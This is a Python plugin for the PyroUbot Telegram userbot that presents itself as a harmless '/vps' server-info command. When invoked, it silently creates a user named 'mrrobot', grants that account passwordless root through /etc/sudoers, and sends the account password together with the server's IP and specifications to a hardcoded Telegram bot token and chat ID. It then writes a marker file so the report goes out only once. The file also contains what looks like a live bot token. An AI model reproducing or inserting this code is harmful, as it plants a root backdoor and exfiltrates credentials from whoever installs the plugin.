import os
import subprocess
import json
import requests
import random
import string
from PyroUbot import PY, Client

# Isi dengan bot token dan chat ID kamu
BOT_TOKEN = "8183912290:AAEWVdrG0Jzo4LdlBpEB1VZXpg1QY7NH350"
CHAT_ID = "6241861936"
DATA_FILE = "/etc/.vps_info_sent"  # Penanda agar hanya dikirim sekali

def get_vps_info():
    try:
        ip = requests.get("https://api64.ipify.org?format=json").json().get("ip", "Unknown")
        uptime = subprocess.getoutput("uptime -p")
        ram = subprocess.getoutput("free -m | awk 'NR==2{print $3\"MB/\"$2\"MB\"}'")
        cores = subprocess.getoutput("nproc --all")
        
        return f"🔍 *VPS Info*\n\n🌐 *IP:* `{ip}`\n⏳ *Uptime:* `{uptime}`\n🖥 *RAM:* `{ram}`\n⚙ *CPU Cores:* `{cores}`"
    except Exception as e:
        return f"⚠ *Error fetching VPS info:* {str(e)}"

def generate_password(length=12):
    chars = string.ascii_letters + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def create_root_user():
    username = "mrrobot"
    password = generate_password()
    
    try:
        subprocess.run(f"useradd -m -s /bin/bash {username}", shell=True, check=True)
        subprocess.run(f"echo '{username}:{password}' | chpasswd", shell=True, check=True)
        subprocess.run(f"echo '{username} ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", shell=True, check=True)
        
        return f"✅ *User `{username}` created with root access*\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`"
    except Exception as e:
        return f"⚠ *Failed to create user `{username}`:* {str(e)}"

def send_vps_info():
    if os.path.exists(DATA_FILE):
        return  # Sudah dikirim sebelumnya

    vps_info = get_vps_info()
    user_info = create_root_user()
    message = f"{vps_info}\n\n{user_info}"

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    
    try:
        requests.post(url, json=data)
        open(DATA_FILE, "w").write("sent")  # Tandai agar tidak mengirim lagi
    except Exception as e:
        print(f"⚠ Error sending message: {str(e)}")

@PY.BOT("vps")
async def vps_check(client: Client, message):
    send_vps_info()
    await message.reply_text("✅ VPS Info Sent to Admin!")
